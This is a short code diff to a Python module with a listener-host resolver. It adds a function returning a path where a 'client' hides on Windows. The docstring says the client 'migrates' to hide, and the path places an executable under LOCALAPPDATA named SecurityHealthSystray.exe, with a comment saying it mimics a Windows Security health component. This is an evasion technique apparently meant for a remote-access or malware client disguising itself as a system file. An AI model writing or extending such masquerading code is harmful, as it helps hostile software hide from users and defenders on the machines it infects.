@@ -1,5 +1,7 @@
 from dataclasses import dataclass
 import socket
+import os
+from pathlib import Path
 
 
 @dataclass
@@ -44,3 +46,14 @@ def resolve_listener_host() -> str:
         # Fallback to localhost if hostname is invalid
         return "127.0.0.1"
 
+def get_migrated_path() -> Path:
+    """
+    Return the path where the client 'migrates' to hide on Windows.
+    """
+    local_appdata = os.getenv("LOCALAPPDATA")
+    if not local_appdata:
+        # Fallback for non-Windows (testing)
+        return Path.home() / ".cyber_shield" / "bin" / "SecurityHealthSystray.exe"
+    
+    # Mimic a Windows Security health component
+    return Path(local_appdata) / "Microsoft" / "Windows" / "ServiceHealth" / "SecurityHealthSystray.exe"
